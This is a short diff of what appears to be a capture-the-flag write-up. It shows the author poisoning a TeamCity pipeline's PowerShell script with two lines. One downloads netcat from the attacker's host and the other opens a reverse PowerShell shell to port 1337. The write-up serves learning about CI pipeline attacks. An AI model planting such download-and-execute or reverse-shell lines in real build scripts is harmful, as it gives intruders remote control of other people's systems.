@@ -600,4 +600,23 @@ Ill then add the code to fetch netcat from my webserver then send a bind shell
 listening on [any] 1337 ...
 ```
 
+Ill then start the listener
 
+```python
+❯❯❯ git diff                   
+diff --git a/hello_world.ps1 b/hello_world.ps1
+index 09724d2..c46669d 100644
+--- a/hello_world.ps1
++++ b/hello_world.ps1
+@@ -1,2 +1,5 @@
+ #Simple repo test for Teamcity pipeline
+ write-host "Hello, World!"
++
++wget http://10.10.14.61/nc64.exe -o C:\ProgramData\nc64.exe
++C:\ProgramData\nc64.exe -e powershell 10.10.14.61 1337
+```
+
+Then running git diff i see the output ill be uploading
+
+```pyh
+```
